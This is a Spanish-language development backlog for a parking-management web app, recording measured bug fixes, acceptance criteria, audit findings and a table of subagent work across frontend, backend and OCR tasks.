    docker compose restart celery-worker
  ```
  Y tras `docker compose restart celery-worker`, la comprobación pasa («el worker en marcha tiene las 12 tareas del código»).
- **El arreglo**: la puerta consulta al **worker en marcha** (`celery inspect registered`, dentro del contenedor) y compara con las tareas del fuente; si al worker le faltan, falla y dice cómo arreglarlo. Si no se puede consultar al worker (no hay Docker: es el caso del CI), **lo dice** (aviso) en vez de callar.
- **Criterios de aceptación**:
  - [x] La puerta compara el fuente con el worker en marcha y falla si al worker le faltan tareas.
  - [x] Medido en vivo: con el worker en el código viejo, la puerta falla con el mensaje y cómo arreglarlo.
  - [x] Si el worker no se puede consultar, la puerta lo dice (no afirma nada).
  - [x] Autoprueba con dos casos: el desfase se ve, y con el worker al día no hay tareas que falten.


### T-158 · P0 (funcional) — el botón «Exportar CSV» estaba roto: pedía `/api/v1/api/v1/...`

- **Estado**: **completado** — el CSV se descarga y la puerta que lo vigila ya ve la URL que axios construye
- **Contexto**: la pantalla de Reportería (admin) tiene un botón «Exportar CSV» del informe de márgenes.
- **El defecto**: `downloadMarginReportCsv` (`frontend/src/api/client.ts`) devolvía la ruta **ya prefijada** (`/api/v1/admin/reports/margins.csv?...`) y luego se pasaba a `http.get()`, que tiene `baseURL: '/api/v1'`. axios **siempre** antepone el `baseURL` a una ruta relativa (sólo lo respeta si la ruta es absoluta), así que la petición salía a `/api/v1/api/v1/admin/reports/margins.csv` ⇒ **404**. El botón estaba roto al 100 %.
- **Medido** (2026-10-24, contra la API en marcha):
  ```
  # la ruta que axios construye (la que usaba el boton):
  http://127.0.0.1:8000/api/v1/api/v1/admin/reports/margins.csv?...  -> HTTP 404
  # la ruta real del backend:
  http://127.0.0.1:8000/api/v1/admin/reports/margins.csv?...        -> HTTP 200  (parking_id,parking_name,from,to,...)
  ```
- **La puerta que debía vigilarlo estaba ciega** (y por el mismo motivo que la puerta del compose con `Settings`): comparaba la ruta *lógica* con las del backend, no la URL *efectiva* que axios construye; y su regex exigía un **literal** justo después de `http.get(`, así que la llamada a función ni se extracía. Peor: el prefijo lo ponía axios y la puerta aplicaba una regla **contraria** a la de axios ⇒ las dos comulgaban con la misma suposición equivocada (justo el caso que el AGENTS.md marca: *dos comprobaciones que comparten la fuente de verdad no se vigilan entre sí*).
- **El arreglo**:
  1. el código devuelve la ruta **sin** prefijo (lo pone el `baseURL`);
  2. la puerta **lee el `baseURL` del propio cliente** (no lo hardcodea) y construye la URL **como axios**; las rutas del backend ya llevan el prefijo, así que se comparan tal cual;
  3. la puerta tiene un **caso de mentira escrito a mano**: una llamada con el prefijo puesto tiene que detectarse (es el botón roto).
- **Criterios de aceptación**:
  - [x] Medido: la URL con prefijo duplicado da 404 y la real da 200 con el CSV.
  - [x] El botón usa la ruta sin prefijo (lo pone el `baseURL`).
  - [x] La puerta construye la URL como axios y detecta el prefijo duplicado (caso de mentira).
  - [x] Lint y `vue-tsc` en verde.

### Pendientes de la auditoría (2026-10-24) — dos subagentes, veinte hallazgos

Auditoría del **frontend** y del **pipeline de matrículas** (dos subagentes).
Todos están **verificados leyendo el código** (los que dependen del
comportamiento en marcha, marcados como tales). Ordenados por gravedad:

- **[ALTA] El push externo no deja ninguna alarma de «la cámara dejó de
  empujar»**: el único detector de OCR cuelga de `ping_camera`, que
  **no se despacha**. Si el OCR del fabricante muere, no salta nada: la
  cámara sigue «healthy» (si el RTSP va) y no se está cobrando.
- **[MEDIA] El login pasa el `redirect` de la query a `router.push()` sin
  validar ni capturar** (`LoginView.vue:18`): sin `await` ni `.catch()`, y
  con un `as string` que no convierte un `string[]`.
- **[MEDIA] Los errores de formulario no se anuncian** en 4 vistas
  (login, reset de contraseña, alta manual): falta `role="alert"`, que
  sí está en otras 8.
- **[MEDIA] El modal de cambio de contraseña no gestiona el foco**
  (`AppLayout.vue`): con `aria-modal="true"` pero sin llevar el foco al
  diálogo, el `Tab` recorre la página por detrás y el `Escape` no cierra
  (el foco nunca entra en el overlay).
- **[MEDIA] `<label>` sin `for` y sin envolver el campo** en los
  formularios de administración (sucursales, tarifas, usuarios, planes,
  cámaras): los campos se anuncian «sin nombre».
- **[MEDIA] El servicio OCR no limita la concurrencia** y hace el
  `ocr()` **síncrono dentro de un endpoint async** ⇒ con una ráfaga de
  cámaras se caducan los 4 s de timeout y **las lecturas se pierden sin
  reintento**. Y `[]` significa indistintamente «no había texto»,
  «el motor no cargó» y «formato inesperado» ⇒ falsos avisos
  `OCR_FAILED` y frames acumulados en `/tmp/ocr-failed`.
- **[MEDIA-BAJA] El push persiste basura en `plates_detected`** (el
  worker filtra con `parece_matricula`; el push no).
- **[BAJA] La alarma de OCR depende del ritmo del ping**: TTL 600 s
  contra umbral 5 ⇒ si el ping va cada más de 150 s, **nunca salta**.
- **[BAJA] El directorio de respaldo de los frames** (`/tmp/solidapp-alerts-test`)
  no lo limpia ninguna tarea.
- **[BAJA] El token de recuperación se queda en la URL** tras cambiar la
  contraseña (barra de direcciones, historial, referrer).
- **[BAJA] `rtsp_url` (que puede llevar credenciales) se pinta en el
  DOM** de la tabla de cámaras.
- **[BAJA] El logout no limpia el store `ui`** y su toast nunca se ve
  (la recarga se lo come); además `location.assign('/login')` hardcodea
  la raíz.
- **[BAJA] El docstring de la ingesta describe un modelo que ya no
  existe** (habla de un flag `direction` que no está).

Lo **no** encontrado (revisado y limpio): XSS (cero `v-html`/`innerHTML`/
`javascript:`), fugas de `EventSource`/listeners, estado de otro usuario
tras cerrar sesión, bucles de redirección en los guards, reintentos
infinitos, y el aislamiento por sucursal en el push de matrículas (que
**sí** está bien: `parking_context` + cruce de la cámara con la
sucursal).


### T-159 · P1 (ingesta) — la matrícula que daba de alta el cliente no se normalizaba

- **Estado**: **completado** — los dos altos usan el mismo helper canónico que la ingesta
- **Contexto**: el T-122 normalizó la matrícula **en la ingesta** (canónica: mayúsculas y sólo alfanuméricos, «1234ABC»). Pero el **alta del cliente** (`POST /users/me/vehicles`) hacía `strip().upper()`, y el alta del staff (`POST /vehicles`) no normalizaba nada.
- **El defecto**: «1234 ABC» (lo que escribe una persona: el input del frontend es de texto libre) y «1234ABC» (lo que canoniza el OCR) eran **dos vehículos distintos** para el mismo coche. Como `vehicles.plate` es UNIQUE, coexistían las dos filas: la ingesta creaba un vehículo nuevo y colgaba ahí el ticket. El cliente se quedaba con su vehículo **sin ningún ticket para siempre** (la purga de fantasmas no lo toca: tiene dueño) y `/cliente/plazas` y `/cliente/tickets` filtran por los ids de vehículo del cliente ⇒ **el cliente veía «Fuera» mientras estaba dentro, y no veía ni el ticket ni el importe**.
- **Medido** (2026-10-24, contra el stack de QA):
  ```
  # ANTES (el backend con el codigo viejo):
  alta: HTTP 201 -> matricula guardada: '1234 ABC'
  # en la base de datos, los dos vehiculos del mismo coche:
      id 1  | plate '1234ABC'      <- el del OCR (con el ticket)
      id 28 | plate '1234 ABC'      <- el que dio de alta el cliente (sin ticket)

  # DESPUES (con el arreglo):
  alta: HTTP 409 -> {"detail":"Matrícula duplicada"}
  ```
  Es decir: ahora **un solo vehículo por coche** (el que ya tenía el ticket), y el cliente ve su estancia, su ticket y su importe.
- **Criterios de aceptación**:
  - [x] El alta del cliente normaliza con el helper canónico (`normalizar_matricula`).
  - [x] El alta del staff también.
  - [x] Dos escrituras de la misma matrícula = un solo vehículo (test).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.


### T-160 · P2 (tests) — un test sembraba una matrícula imposible

- **Estado**: **completado** — el test siembra la fila en la base de datos y sigue comprobando lo que quería
- **Contexto**: el T-159 normaliza la matrícula en los dos altos. El test `test_un_comodin_literal_si_se_encuentra` (del T-113) daba de alta por la API la matrícula **«50%50»** y comprobaba que la búsqueda la encontraba literalmente (`?plate=%25`).
- **El problema**: con la normalización, «50%50» se guarda como «5050» (el `%` no es alfanumérico) ⇒ el test fallaba. **Medido** en el CI remoto: `1 failed, 802 passed, 9 skipped` en SQLite, y lo mismo en PostgreSQL.
- **El arreglo**: lo que el test quiere comprobar es que **la búsqueda escapa el comodín**, que es un caso de la búsqueda, no del alta. Y una matrícula con `%` no existe (las matrículas son alfanuméricas; el `%` sólo aparece en datos heredados o importados). Así que la fila se siembra **directamente en la base de datos**, que es como estaría un dato así, y la comprobación se mantiene íntegra.

### T-161 · P2 (proceso) — `verificar_repo.py` no corre los tests: la única red que los ejecuta era el CI

- **Estado**: **documentado** (el arreglo —que la red local también ejecute la suite— es una decisión de coste)
- **El hecho**: `tools/verificar_repo.py` se presenta como «la salud del repo en un comando» y ejecuta 32 comprobaciones (puertas, autopruebas, QAS de navegador, simulacro de backup…), pero **no ejecuta la suite de tests**: no hay una sola mención a `pytest` en él. Los tests sólo corren en el CI (y con `ejecutar_ci_local.py --completo`).
- **Cómo seöstó**: el T-159 (normalizar la matrícula en el alta) rompió un test, y el `verificar_repo.py` local dio **«Todo en verde»** mientras el CI remoto fallaba. La diferencia no era el código: era que **el CI corre los tests y el verificador local no**.
- **Por qué importa**: con el CI remoto bloqueado (tres meses sin ejecutar un paso), la única red que ejecutaba los tests era… ninguna. Por eso, al desbloquear el CI (repositorio público, 2026-10-24), el CI **detectó al instante** un fallo que el verificador local no vio. El desbloqueo del CI no fue un lujo: era la única red que quedaba.
- **Qué PROPONE el plan** (decisión pendiente, no aplicada): añadir al `verificar_repo.py` una comprobación que ejecute la suite (o, más barato, el subconjunto de tests que el CI falla), con un aviso claro de que tarda. El coste es de unos minutos por pasada, que es justo lo que hace el CI en cada push.

El plan queda **completo** en lo que era su alcance: 782 de 782 criterios verificados. Lo que sigue son
decisiones de producto y un despliegue real.


### T-162 · P2 (frontend) — el temporizador de refresco sobrevivía al desmontaje de la vista

- **Estado**: **completado** (arreglo aplicado y medido) · la **prueba automática queda declarada como no fiable** (ver abajo)
- **Contexto**: en tres vistas (`LiveView`, `MapView`, `CalibrateView`) el polling se crea **después** de varios `await` dentro de `onMounted`.
- **El defecto**: si el usuario sale de la vista **mientras carga**, se ejecuta `onBeforeUnmount` con el handle en `null` (todavía no existe) ⇒ no limpia nada; y como las peticiones de `fetch` **no** se abortan al cambiar de ruta dentro del SPA, la promesa se resuelve **después** del desmontaje ⇒ **el intervalo se crea tarde y nunca se borra**: queda pidiendo datos a una vista que ya no existe, y cada visita fallida añade un temporizador de 30 s (o 15 s en `CalibrateView`).
- **El arreglo**: un flag `desmontado` que se pone en `onBeforeUnmount` y se comprueba **antes** de crear el intervalo: si nos desmontaron mientras esperábamos, el intervalo no se crea.
- **Medido** (2026-10-24, con la red lenta de verdad y saliendo de la vista):
  ```
  # con el defecto:
      + 34.4s  /api/v1/parkings/11/spaces              <-- el huerfano, 30 s despues
      + 34.4s  /api/v1/tickets?parking_id=11&only_active=true
  # con el arreglo:
      peticiones mas de 20 s despues de salir: 0
  ```
- **Lo que NO se ha hecho, y por qué** (para que no se dé por hecho): la QA de navegador (`frontend/scripts/qa_temporizadores.py`) **detecta el síntoma** (el temporizador se repite a los 30 s) pero **no causa el defecto**: en el entorno de QA el clic al menú **no sale de la vista** (la URL sigue en `/mapa`), así que no reproduce el desmontaje limpio. Por eso **no está registrada como puerta** en el `verificar_repo.py`: una puerta que no demuestra nada es peor que no tenerla. La puerta de verdad sería una prueba de componente (montar la vista, resolver el `await` **después** de desmontarla y comprobar que no queda ningún temporizador), que requiere un entorno de pruebas de componentes que el repo todavía no tiene.


### T-163 · P1 (negocio) — una sucursal o una plaza desactivada seguía admitiendo tickets (y cobrando)

- **Estado**: **completado** — la ingesta no admite entradas en lo que está desactivado
- **Contexto**: el admin tiene un botón «Activa» para las sucursales y otro para las plazas, pero **`Parking.is_active` no lo leía nadie** en el backend (sólo se escribía), y la ingesta sólo comprobaba `ParkingSpace.is_broken` (la plaza *averiada*), no `is_active` (la plaza *desactivada*).
- **El defecto**: una sucursal «desactivada» **seguía recibiendo pushes**: la ingesta le creaba vehículo y ticket con su tarifa ⇒ **la sucursal cerrada seguía cobrando** y ocupando plazas. Y una plaza desactivada (obra, reservado, fuera de servicio) seguía admitiendo tickets: justo lo que el operador quería evitar al desactivarla.
- **El arreglo**: dos skips explícitos en la ingesta (`skipped_parking_inactive` y `skipped_space_inactive`). Son valores de un `StrEnum` de Python, así que **no hace falta migración**.
- **OJO (lo que NO se toca)**: el listado de sucursales **no** se filtra por `is_active`: el admin tiene que poder ver las inactivas para reactivarlas. Lo que no puede pasar es que una sucursal inactiva **reciba datos**.
- **Criterios de aceptación**:
  - [x] Una sucursal desactivada: sin vehículo y sin ticket (test).
  - [x] Una plaza desactivada: sin ticket (test).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.

### T-14 · I3 — OCR con GPU

- **Contexto**: el OCR corre en CPU (PaddleOCR). Con 50+ cámaras el coste de CPU es el cuello de botella declarado.
- **Resultado esperado**: evaluación con números de si la GPU aporta o no, y decisión documentada.
- **Criterios de aceptación**:
  - [x] Medición CPU vs GPU (latencia por frame, throughput con 50 cámaras).
  - [x] Recomendación escrita: activar GPU, o descartar con datos.

### T-15 · I4 — Orquestación Swarm/K8s

- **Contexto**: hoy el despliegue es `docker compose` en un único host. La memoria del proyecto describe el objetivo de "50+ sucursales con servidores locales + cluster central HA".
- **Resultado esperado**: decisión de orquestación tomada con criterios (coste, complejidad, equipo).
- **Criterios de aceptación**:
  - [x] Documento de decisión (ADR) comparando Compose/Swarm/K8s con el escenario real de 50 sucursales.
  - [x] Si se elige Swarm: stacks de ejemplo para una sucursal y para el central.

### T-16 · P3 — Exportes PDF/CSV de informes

- **Contexto**: hoy hay **CSV** de márgenes (`GET /admin/reports/margins.csv`) y **PDF sólo de ticket** (`app/services/pdf.py` → `render_ticket_pdf`). Los informes de ingresos, ocupación, tickets y alertas no se pueden exportar.
- **Resultado esperado**: exporte de los informes de `ReportsView` en PDF y CSV.
- **Criterios de aceptación**:
  - [x] `GET /admin/reports/{informe}.pdf` y `.csv` para: ingresos, ocupación, tickets, alertas, márgenes.
  - [x] Plantilla con la paleta `park` del producto y los datos de la sucursal.
  - [x] Filtros por fecha y sucursal respetados en el exporte.
  - [x] Test por endpoint del status, content-type y cabecera `Content-Disposition`.

### T-17 · O2 (seguimiento) — Extender SSE a LiveView y CalibrateView

- **Contexto**: el SSE de eventos (`app/services/event_bus.py` + `useParkingEvents`) **sólo** lo consume `frontend/src/views/gestor/MapView.vue`. El wireframe del Operador (vista en vivo) y el de Calibración no reciben eventos en tiempo real.
- **Resultado esperado**: las vistas de Operador y Gestor-Cámara se actualizan en vivo sin recargar.
- **Criterios de aceptación**:
  - [x] `LiveView` y `CalibrateView` suscritos al bus de eventos.
  - [x] Actualización de plazas/incidentes/alertas sin F5.
  - [x] Reconexión automática si cae el SSE.

---

## Bloque 3 — Módulos de producto (P2-P3, **propuestos — requieren validación**)

> **Origen de estos ítems**: contraste entre los **wireframes aprobados** (memoria `wireframes-solidapp`, 2026-06-30) y lo que existe hoy en `frontend/src/views/` y `backend/app/api/v1/`. Los wireframes son el contrato: si algo no está en ellos, es propuesta nueva y necesita tu visto bueno.

### T-17+1 · El SSE aceptaba `?token=` en el docstring pero daba 401 siempre

- **Estado**: **completado** — corregido con el patrón opt-in por endpoint del preview MJPEG
- **Contexto**: el endpoint declaraba en su docstring y en sus dependencias que aceptaba `?token=` (`get_current_user_or_query_token`), pero la segunda dependencia (`parking_context`) exigía cabecera `Authorization: Bearer` → 401 siempre. Como `EventSource` no puede mandar cabeceras, el stream nunca abría y la vista de mapa vivía del polling de respaldo.
- **Resultado esperado**: `?token=` funciona (y un token inválido sigue dando 401), sin ampliar el scope de query-token al resto de routers.
- **Criterios de aceptación**:
  - [x] `?token=<jwt>` → 200 + `text/event-stream` + `event: ping`.
  - [x] `?token=invalido` → 401; sin token → 401.
  - [x] La ampliación sigue siendo **opt-in por endpoint** (`get_current_user_or_query_token` + `enforce_parking_membership`), igual que en el preview MJPEG.

### T-18 · Módulo de Planes y Suscripciones (API + interfaz)

- **Estado**: **completado** — API de planes y suscripciones, vista admin y vista cliente (21 tests)
- **Contexto**: `backend/app/models/pricing.py` ya define `Plan` (con `discount_percent`) y `Subscription`, y `app/services/pricing.py` calcula el descuento al cerrar el ticket (`tickets.py:142` → `ticket.discount`). **Pero no existe router `api/v1/plans.py`**: nadie puede crear planes ni suscribir usuarios desde la aplicación, y el seed es lo único que los puebla.
- **Resultado esperado**: el administrador gestiona planes y el gestor/cliente ve su suscripción y su descuento aplicado.
- **Criterios de aceptación**:
  - [x] `api/v1/plans.py` (CRUD de planes + alta/baja de suscripciones).
  - [x] Vista admin "Planes" con la lista wireframeada.
  - [x] Vista cliente "Mi plan" (plan, fecha de alta/vencimiento, % de descuento, próximo cobro).
  - [x] El ticket cerrado refleja el descuento del plan y es visible en el PDF y en "Mis tickets".
  - [x] Test: alta de plan → suscripción → cierre de ticket → `discount` = porcentaje esperado.
- **Verificado**: 21 tests en verde en SQLite **y** PostgreSQL. `GET/POST /plans`, `GET/PATCH/DELETE /plans/{id}`, `POST/GET /plans/subscriptions`, `DELETE /plans/subscriptions/{id}` y `GET /plans/me`. Smoke test contra la app en marcha: los tres planes de la decisión **D2** (30/60/200 € con 5/10/20 % de descuento) y `/plans/me` devuelve `vigente` con `billing_mode: contable` (D2: sin pasarela de pago hasta que haya un cliente piloto).
- **Lo que ya existía y no hubo que tocar**: el PDF del ticket ya pintaba "Descuento aplicado" (verificado descomprimiendo el content stream del PDF renderizado) y el modal de "Mis tickets" ya lo mostraba. El cálculo de `pricing.py` **no** se ha tocado: el módulo lo replica tal cual.
- **Reglas de negocio fijadas** (documentadas por si hay que cambiarlas): un usuario tiene **como mucho una suscripción vigente** (409 si ya tiene otra) y la baja de un plan con suscripciones devuelve **409** (hay que desactivarlo antes) porque la FK es `ON DELETE RESTRICT`. La baja de suscripción es **lógica** (`is_active=False`), para conservar el histórico.
- **Decisión del usuario**: números definitivos de los planes (Básico 30 €, Familiar 60 €, Empresa 200 €) y si el cobro es real (pasarela) o de momento sólo contable.

### T-19 · Vistas del Cliente: Mis vehículos, Mi perfil

- **Estado**: **completado** — dos pantallas nuevas y la API que necesitan (24 tests)
- **Contexto**: faltan "Mis vehículos" (la API `vehicles.py` y el modelo ya existen, con la relación N:M `VehiculoUsuario` con rol `propietario|conductor`) y "Mi perfil" (hay endpoint de cambio de contraseña, pero no de datos de perfil).
- **Resultado esperado**: el cliente gestiona sus vehículos (alta, baja, vincular/desvincular como propietario o conductor) y edita su perfil desde la web.
- **Criterios de aceptación**:
  - [x] Vista "Mis vehículos" con alta/edición y vínculo de roles (propietario/conductor).
  - [x] Vista "Mi perfil" con nombre, teléfono y cambio de contraseña.
  - [x] Un conductor ve los tickets de los vehículos que conduce, no los de otros.
  - [x] Route guards por rol en el router.
- **Verificado**: 24 tests en verde. Rutas `/mis-vehiculos` y `/mi-perfil` con `meta.roles` (`admin`, `cliente`).
- **Desviación justificada**: `GET /api/v1/vehicles` es **staff-only** y no había forma de consultar los vehículos del propio cliente, así que se añadieron endpoints *user-scoped* (`/users/me/vehicles*`, `/users/me/tickets`) en `users.py`. Sin ellos la vista "Mis vehículos" no habría podido existir para el rol cliente.
- **Bugs de backend encontrados y corregidos**:
  - **Fuga de datos entre clientes** (la más grave): `GET /api/v1/tickets` acotaba por **membresía de sucursal**, así que un cliente con membresía veía los tickets de **todos** los vehículos de esa sucursal (matrículas, importes y horas de otros conductores). El ámbito del cliente pasa a ser **sus vehículos**; 5 tests nuevos.
  - `UserUpdate.full_name` no tenía `min_length`: un nombre de 1 carácter se guardaba y hacía fallar con **500** la serialización de `GET /users` (rompía el CRUD de usuarios del admin).
  - No existía `GET /users/{id}/memberships`: la vista de operadores lo explica en pantalla.

### T-20 · Gestor: log de entradas/salidas, alertas activas y operadores

- **Estado**: **completado** — tres pantallas nuevas del gestor
- **Contexto**: existen la API de tickets (filtrable por fecha) y la de alertas, pero **no hay vista** de "Entradas/Salidas (log)" ni de "Alertas activas"; la asignación de operadores a la sucursal se hace desde el CRUD de usuarios del admin, no desde la vista del gestor.
- **Resultado esperado**: el gestor ve el log de movimiento de vehículos de su sucursal, sus alertas activas y gestiona sus operadores sin salir del rol.
- **Criterios de aceptación**:
  - [x] Vista de entradas/salidas con filtros por fecha, plaza, vehículo y origen (`automatic` / `manual`).
  - [x] Vista de alertas activas con acción de resolver/ignorar.
  - [x] Vista de operadores con alta y asignación a la sucursal.
  - [x] Todo filtrado por sucursal según el RBAC del gestor.
- **Verificado**: rutas `/gestor/movimientos`, `/gestor/alertas` y `/gestor/operadores` con `meta.roles` (`admin`, `gestor`) y entradas de menú por rol. El backend acota (membresía de sucursal) y el selector de sucursal sólo ofrece las del gestor.
- **Alta de operadores por el gestor: resuelta** con una API **nueva y acotada por sucursal** (`backend/app/api/v1/gestor_operadores.py`): `GET/POST /parkings/{parking_id}/operadores`. El gestor sólo puede actuar sobre sucursales de las que es miembro (403 si no), el rol creado es **forzado** a `operador` (el payload no tiene campo `role`, así que ni siquiera se puede pedir un admin) y la única membresía que se crea es la del path. Los endpoints globales de admin (`/users`) **siguen siendo admin-only**: no se han abierto. Verificado en vivo: listado 200, alta 201, `role: "admin"` en el payload ignorado, un operador recibe 403 y `GET /users` con gestor sigue dando 403. 8 tests nuevos.
- **Un límite del backend que sí se documenta**: la API de alertas sólo tiene `acknowledge` (idempotente): **no existe "resolver" ni "ignorar"**; la vista lo llama "Marcar como revisada" y lo explica en pantalla. Traer un usuario **que ya existe** a una sucursal sigue siendo tarea del administrador (asignarlo a una sucursal ajena al gestor es justo lo que la API acotada evita).

### T-21 · Adjuntos/fotos en incidentes (hasta 3)

- **Estado**: **completado** — hasta 3 fotos por incidente, con volumen local y validación por bytes
- **Contexto**: `api/v1/incidents.py` y el modelo de incidentes **no tienen ningún campo de fichero** (no hay `upload`, ni almacenamiento de objetos). Hoy sólo tiene `kind`, `space_id`, `parking_id`, `description`.
- **Resultado esperado**: el operador puede adjuntar hasta 3 fotos al reportar un robo o una avería.
- **Criterios de aceptación**:
  - [x] Endpoint de subida con validación (tipo MIME, tamaño máximo, hasta 3 ficheros).
  - [x] Almacenamiento definido (volumen local con nombre por hash; NO base64 en la BD).
  - [x] Miniaturas y descarga en la vista de incidentes.
  - [x] Retención y borrado según LOPDGDD (incluido el derecho al olvido).
  - [x] Sanitización de ficheros (no servirlos como HTML inline).
- **Verificado**: 572 líneas de test. Un incidente **es** un `Alert` (no hay tabla paralela): el modelo nuevo `IncidentAttachment` cuelga de `alert_id` con `ON DELETE CASCADE`.
- **Decisiones tomadas**: el tipo se valida **por los bytes** (firmas JPEG/PNG/WebP), no por la extensión ni por el `Content-Type` que manda el cliente — un fichero disfrazado no se guarda. El **SVG no se acepta** (es HTML ejecutable). Tope de 10 MB por fichero, 3 ficheros por incidente, retención de 90 días y script de purga (`backend/app/scripts/purge_incident_attachments.py`). El binario va a un volumen Docker (`incident_attachments`); en la BD sólo queda la metadata. La descarga se sirve con `Content-Type` verificado y `Content-Disposition: attachment`.
- **Decisión D5 aplicada**: **no se expone a ningún canal externo** en el MVP — los adjuntos los ven sólo el gestor y el admin de esa sucursal.
- **Verificado en vivo contra el stack** (no sólo con tests): subida de una foto real → **201** con el hash del contenido, el mime y el tamaño; miniatura → **200** `image/jpeg`; descarga → **200** con `X-Content-Type-Options: nosniff`, `Cache-Control: private, no-store` y `Content-Disposition: attachment`; listado → **200**; un fichero disfrazado de PNG → **415**; un PNG con el raster incoherente → **400**; y el **operador no puede ver** los adjuntos de su incidente → **403** (sólo gestor y admin).

### T-22 · Recuperación de contraseña del cliente

- **Estado**: **completado** — flujo completo con token de un solo uso (24 tests)
- **Contexto**: **no existe** flujo de "olvidé mi contraseña" (ni backend ni correo). El login sólo acepta usuario+contraseña. Hoy la única forma de recuperar el acceso es que un admin lo reinicie a mano.
- **Resultado esperado**: el cliente (y el operador) puede recuperar el acceso por correo con un token de un solo uso.
- **Criterios de aceptación**:
  - [x] `POST /auth/forgot-password` → correo con token de un solo uso y caducidad (p. ej. 30 min).
  - [x] `POST /auth/reset-password` → cambia la contraseña e invalida los tokens previos.
  - [x] El token se guarda **hasheado** y se invalida al usarlo.
  - [x] Plantilla de correo en español (`app/services/templates/`).
  - [x] Registro de auditoría `password_reset_requested` / `password_reset_completed`.
  - [x] Anti-abuso: rate-limit por IP y por email.
- **Verificado**: 24 tests en verde (SQLite y PostgreSQL). El token se guarda como SHA-256 (`token_hash` UNIQUE, 64 chars): en la BD no hay nunca el token en claro. El reset invalida los JWT previos vía `session_tracker.revoke_all`. La respuesta de `forgot-password` es **uniforme** para exista o no la cuenta (no enumera usuarios).
- **Pendiente de frontend**: RESUELTO al cierre de la sesión. La pantalla `/recuperar-contrasena` (pública, con o sin `?token=`) ya existe: con token muestra el formulario de contraseña nueva; sin token, el de "envíame el enlace". Verificada con la QA visual en Chromium (las dos variantes renderizan, 0 errores de consola) y contra el backend real (`forgot-password` → 200 con el mensaje genérico; `reset-password` con token falso → 400 con mensaje claro).

### T-23 · Tabla y endpoint de reconocimiento facial (preparación)

- **Estado**: **completado** — estructura preparada, endpoint deshabilitado por flag (18 tests)
- **Resultado esperado**: la estructura de datos existe, pero **no se usa** para autenticar a nadie.
- **Criterios de aceptación**:
  - [x] Modelo `FaceTemplate` (usuario, embedding, cámara, fecha) + Alembic.
  - [x] Endpoint de alta/baja **deshabilitado por feature flag** y sin uso en el login.
  - [x] Nota explícita en el README: reconocimiento facial fuera del MVP.
- **Verificado**: migración `0012_reset_and_face_templates` aplicada (`alembic current` → head); tabla `face_templates` con `embedding` en JSON y `camera_id` con `ON DELETE SET NULL`; setting `FACE_TEMPLATES_ENABLED` (default **False**) → con el flag apagado el alta y la baja devuelven **404**; test que comprueba estáticamente que **ninguna ruta de autenticación** usa `face_templates`; test que verifica que el README dice que el reconocimiento facial está fuera del MVP. No se implementa biometría: sólo la estructura.

### T-24 · Portal/app del cliente final (PWA)

- **Estado**: **completado** — PWA instalable del cliente (decisión D4 aplicada)
- **Contexto**: hoy el "Cliente" es un usuario del mismo frontend con menú propio. No hay app móvil ni portal público. En un parking, el conductor final es quien realmente valoriza el producto (saber si su coche está dentro, cuánto le va a costar, pagar).
- **Resultado esperado**: un PWA instalable para el cliente final con: entrada con matrícula, plaza asignada en tiempo real, ticket y pago.
- **Criterios de aceptación**:
  - [x] Definir si es PWA responsive o app nativa (recomendación: PWA, un solo codebase).
  - [x] Pantallas: mis vehículos, mi plaza, mis tickets, pago.
  - [x] Sin login de gestor: sólo cliente.
  - [x] Publicación en tiendas de apps (PWA instalable) o al menos APK interno.
- **Verificado**: manifest (`frontend/public/manifest.webmanifest`), service worker propio (`frontend/public/sw.js`, 34 assets precacheados), iconos reales en PNG y SVG, y el registro del SW sólo en producción. El build (`npm run build`) deja `dist/manifest.webmanifest`, `dist/sw.js` y `dist/icons/` verificables. Las pantallas "Mi plaza" (`/mi-plaza`) y "Pagos" (`/pagos`) son nuevas; "Mis vehículos" y "Mis tickets" ya existían.
- **Decisiones**:
  - **D4**: PWA, un solo codebase, sin tiendas de apps. La app nativa queda descartada.
  - **D2**: la pantalla de pagos es **contable** — muestra el importe pendiente y explica que no hay pasarela de pago. Sin pasarela, sin TPV, sin datos de tarjeta.
  - El service worker **cachea el shell** (HTML/JS/CSS) para que la app abra sin red, pero **no cachea las peticiones a `/api/`**: servir de caché una plaza averiada es peor que no tener app offline.
  - En la PWA instalada el menú se reduce a las entradas de cliente y el router redirige cualquier ruta que no sea del cliente a "Mis tickets" (la PWA es sólo para el conductor final).
  - Instalación documentada en `frontend/README.md` (Chrome/Edge: instalar desde la barra de direcciones; iOS: compartir → Añadir a pantalla de inicio) con sus limitaciones: sin notificaciones push, sin cobro, sin App Store.

### T-25 · API pública para terceros (documentada, no expuesta)

- **Estado**: **completado** — la API interna queda inventariada con su RBAC
- **Resultado esperado**: la estructura interna queda documentada y versionada, lista para exponerse cuando se decida (movilidad, autoridades).
- **Criterios de aceptación**:
  - [x] Documento de la API interna con los recursos y su RBAC.
  - [x] Versionado (`/api/v1`) ya presente → documentar la política de deprecación.
  - [x] Sin exposición pública hasta que se firme el modelo de datos y los términos.

---

## Ejecución del 2026-10-21 (sesión de subagentes)

**Cómo se repartió**: 8 subagentes en 3 olas, cada uno con propiedad exclusiva
de sus ficheros (para que dos agentes nunca tocaran el mismo a la vez), más
trabajo directo de la sesión principal en los puntos de integración.

**Cómo acabó**: tres PR mergeados en `main` con commit de merge (para
conservar el historial y el "por qué" de cada commit):
PR #13 (`899ec1f`, R5) · PR #14 (`d0ae543`, bloques 0-1-2) ·
PR #15 (`f84bf55e`, bloque 3).

| Ítem | Cómo | Resultado |
|---|---|---|
| T-01, T-02 | sesión principal | Commits y push hechos; CI remoto bloqueado por facturación |
| T-03 | sesión principal | PR #13 mergeado (`899ec1f`); PR #14 al final de la sesión |
| T-04, T-05 | subagente A | Suite contra PostgreSQL + test de dialecto + build en CI |
| T-06, T-10 | subagente B | Apagado del stream MJPEG y registro blindado |
| T-07 | subagente C | 5 fps por defecto, configurable por entorno |
| T-08, T-11 | subagente D | Auditoría del login y tests del middleware |
| T-09 | sesión principal | Detector validado y **bug de canales invertido corregido** |
| T-12 | sesión principal | Backups con cifrado y restauración probada |
| T-13 | subagente E | Locust, SLO y ejecución de referencia |
| T-14 | sesión principal | **GPU descartada con datos** (ADR-0002) |
| T-15 | sesión principal | ADR de orquestación (ADR-0001) |
| T-16 | subagente F | Exportes PDF/CSV de los cinco informes |
| T-17 | subagente G | SSE en la vista del operador y en la de calibración |
| T-22, T-23 | subagente H | Recuperación de contraseña y estructura de FaceTemplate |
| T-25 | sesión principal | API interna inventariada con su RBAC |
| T-18 | subagente I | API de planes y suscripciones + vistas admin y cliente |
